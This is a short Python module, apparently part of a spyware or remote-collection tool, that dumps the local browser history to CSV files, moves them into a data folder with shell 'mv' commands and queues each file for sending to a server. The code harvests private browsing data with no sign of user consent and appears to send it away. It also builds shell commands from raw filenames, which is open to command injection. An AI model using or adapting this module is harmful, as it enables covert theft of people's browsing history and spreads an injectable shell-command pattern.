import browserhistory
import os
from global_variables import run_command
from send_to_server import add_to_send_queue
"""
Gets browser history
"""
def run(options):
    moduleDirectory = "./Data/browser_history"
    browserhistory.write_browserhistory_csv()
    for filename in os.listdir('.'):
        if ".csv" in filename:
            print(filename)
            run_command("mv " + filename + " " + moduleDirectory)
    for filename in os.listdir(moduleDirectory):
        add_to_send_queue(moduleDirectory + "/" + filename)
